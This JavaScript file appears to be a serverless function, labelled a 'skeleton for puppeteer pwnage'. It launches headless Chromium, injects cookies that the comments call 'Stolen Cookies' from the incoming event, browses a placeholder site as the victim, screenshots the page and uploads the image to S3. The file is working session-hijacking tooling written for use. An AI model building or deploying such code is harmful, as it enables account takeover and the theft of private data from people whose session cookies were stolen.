/**
 *
 * Skeleton for puppeteer pwnage 
 * Simple screenshot
 *
 **/

const { uploadScreenshot } = require("./uploadScreenshot");
const puppeteer = require("puppeteer-core");
const chromium = require("@sparticuz/chromium");

module.exports.pwn = async (event) => {
        try {
              const browser = await puppeteer.launch({
                      args: chromium.args,
                      defaultViewport: chromium.defaultViewport,
                      executablePath: await chromium.executablePath(),
                      headless: chromium.headless,
                      ignoreHTTPSErrors: true,
                    });

              // Set Stolen Cookies
              const d=JSON.parse(JSON.stringify(event));
              const stolenCookies=d.cookies;
              //console.log(d.cookies);
              //console.log(stolenCookies);

              // define name for this puppeter action
              const screenshot = `snktest-${event.login}`;
              // define temp screenshot file
              const imagePath = `/tmp/${screenshot}-${new Date().getTime()}.png`;

              // Start headless navigation
              const page = await browser.newPage();
              await page.setCookie(...stolenCookies);

              await page.goto("https://example.com", { waitUntil: "networkidle0" });

              console.log("Page Title:", await page.title());

              await page.screenshot({ path: imagePath })

              await page.close();

              await browser.close();
  //Debug purpose as usual 
  console.log(' screenshot done ')

  // upload screenshot to S3
  const url = await uploadScreenshot(imagePath, screenshot);

  //return result;
  console.log('result: ' + url )
            } catch (error) {
                  throw new Error(error.message);
                }
      };
